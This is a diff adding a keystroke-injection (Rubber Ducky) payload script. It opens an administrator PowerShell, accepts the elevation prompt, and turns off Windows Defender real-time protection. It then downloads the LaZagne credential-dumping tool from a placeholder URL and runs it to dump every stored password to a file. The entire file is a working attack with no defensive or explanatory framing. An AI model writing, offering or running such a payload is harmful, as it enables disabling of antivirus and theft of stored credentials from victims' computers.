@@ -1,0 +1,16 @@
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 200
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://url to laZagne','%TEMP%\laZagne.exe');}
+ENTER
+DELAY 8000
+STRING %TEMP%\laZagne.exe all -oN > c:\%COMPUTERNAME%_%USERPROFILE%-output.txt
+ENTER
+DELAY
